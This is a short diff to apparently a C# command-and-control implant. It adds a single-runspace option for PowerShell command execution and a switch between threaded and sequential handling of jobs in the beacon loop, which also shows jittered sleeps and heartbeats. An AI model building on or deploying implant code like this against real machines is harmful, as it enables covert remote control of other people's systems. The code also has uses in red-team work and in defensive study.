@@ -162,7 +162,7 @@ namespace NuagesSharpImplant
             Directory.SetCurrentDirectory(path);
             if (this.config["shell"].ToLower() == "powershell")
             {
-                result = Utils.Posh.posh(cmd);
+                result = Utils.Posh.posh.execute(cmd, config.ContainsKey("singlePoshRunspace") && config["singlePoshRunspace"].ToLower()=="true");
                 hasError = false;
             }
             else
@@ -831,12 +831,23 @@ namespace NuagesSharpImplant
                     int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
                     Thread.Sleep(jitter);
                     this.Heartbeat();
-                    foreach (JsonValue job in this.jobs)
+                    string multiThread = this.config.ContainsKey("multiThread") ? this.config["multiThread"] : "true";
+                    if (multiThread.ToLower() == "false")
                     {
-                        Thread thread = new Thread(() => this.ExecuteJob((JsonObject)job));
-                        this.threads[job["_id"]] = thread;
-                        thread.Start();
+                        foreach (JsonValue job in this.jobs)
+                        {
+                            this.ExecuteJob((JsonObject)job);
+                        }
                     }
+                    else
+                    {
+                        foreach (JsonValue job in this.jobs)
+                        {
+                            Thread thread = new Thread(() => this.ExecuteJob((JsonObject)job));
+                            this.threads[job["_id"]] = thread;
+                            thread.Start();
+                        }
+                    }    
                 }
                 catch (WebException ex)
                 {
